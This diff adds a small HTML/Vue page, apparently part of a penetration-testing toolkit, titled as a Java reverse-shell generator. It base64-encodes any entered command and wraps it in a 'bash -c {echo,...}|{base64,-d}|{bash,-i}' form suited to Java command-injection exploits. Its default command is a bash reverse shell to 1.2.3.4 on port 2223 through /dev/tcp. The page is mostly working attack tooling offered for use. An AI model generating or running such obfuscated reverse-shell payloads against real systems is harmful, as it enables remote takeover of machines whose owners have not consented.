@@ -1,0 +1,88 @@
+<meta charset="UTF-8">
+
+<script src="../assets/js/crypto-js.min.js"></script>
+<script src="../assets/js/vue.global.prod.min.js"></script>
+
+<h1>java反弹shell生成</h1>
+<div id="app">
+    <p><input v-model="cmd" @keyup="update" @change="update" placeholder="cmd"></p>
+    <p>{{ plain }}</p>
+</div>
+
+<script>
+    function decrypt(base64) {
+        var parsedWordArray = CryptoJS.enc.Base64.parse(base64);
+        var parsedStr = parsedWordArray.toString(CryptoJS.enc.Utf8);
+        return parsedStr
+    }
+
+    function encrypt(rawStr) {
+        // var rawStr = "hello world!";
+        var wordArray = CryptoJS.enc.Utf8.parse(rawStr);
+        var base64 = CryptoJS.enc.Base64.stringify(wordArray);
+        return base64
+    }
+
+
+    var app = Vue.createApp({
+        data() {
+            return {
+                cmd: '/bin/bash -i >& /dev/tcp/1.2.3.4/2223 0>&1',
+                key: '',
+                plain: 'encrypted bash',
+            }
+        },
+        computed: {
+            update() {
+                console.log('updated run')
+                this.cmd && this.test();
+                // this.cmd && this.key && this.test();
+            },
+        },
+        methods: {
+            test() {
+                // const alg = ['AES', 'DES', 'Rabbit', 'TripleDES', 'RC4']
+                // const result = alg.reduce((a, ALG) => {
+                //     return {...a, [ALG]: decrypt(this.cmd, this.key, ALG)}
+                // }, {})
+                let plain1 = encrypt(this.cmd);
+                console.log(plain1)
+                this.plain = `bash -c {echo,${plain1}}|{base64,-d}|{bash,-i}`
+            },
+        },
+        mounted() {
+            this.test();
+        }
+    }).mount('#app');
+
+</script>
+
+
+<!-- anywhere on the page -->
+<style>
+    table {
+        border-collapse: collapse;
+        width: 100%;
+    }
+
+    td {
+        border: 1px solid;
+        white-space: pre;
+    }
+
+    td:nth-child(1) {
+        width: 120px;
+    }
+
+    input {
+        width: 80%;
+    }
+
+    body, td {
+        font-family: ui-monospace, "Cascadia Mono", "Segoe UI Mono", "Liberation Mono", Menlo, Monaco, Consolas, monospace;
+        font-size: 19px;
+        font-weight: 400;
+        line-height: 1.5em;
+    }
+
+</style>
